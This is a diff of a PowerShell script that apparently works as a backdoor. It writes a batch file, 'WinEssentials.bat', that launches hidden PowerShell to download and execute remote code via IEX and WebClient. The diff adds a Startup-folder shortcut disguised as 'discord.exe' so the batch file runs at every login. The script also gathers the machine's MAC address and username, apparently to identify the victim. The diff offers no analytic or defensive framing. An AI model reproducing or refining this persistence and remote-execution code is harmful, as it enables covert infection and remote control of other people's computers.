@@ -10,13 +10,15 @@ $consolePtr = [Console.Window]::GetConsoleWindow()
 
 Add-Type -AssemblyName System.Windows.Forms
 
+$wshell = New-Object -ComObject wscript.shell;
+
 $sysfunctions = gci function:
 function help {
 gci function: | where {$sysfunctions -notcontains $_}
 }
 
 function Install {
-cd "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+cd "$env:APPDATA"
 
 New-Item -Path . -Name "WinEssentials.bat" -ItemType "file" -Value @"
 @echo off
@@ -25,6 +27,10 @@ start powershell.exe -windowstyle hidden -command IEX (New-Object System.Net.Web
 
 exit
 "@
+
+$Shortcut = $wshell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\discord.exe")
+$Shortcut.TargetPath = "$env:APPDATA\WinEssentials.bat"
+$Shortcut.Save()
 }
 
 Install -sting test
@@ -33,7 +39,6 @@ $ps = "";
 $localMac=Get-WmiObject win32_networkadapterconfiguration | select macaddress
 $id = ($localMac[1] -split '=')[1].replace("}","")
 $username=( ( Get-WMIObject -class Win32_ComputerSystem | Select-Object -ExpandProperty username ) -split '\\' )[1]
-$wshell = New-Object -ComObject wscript.shell;
 
 function wait {
 param([int]$wwee)
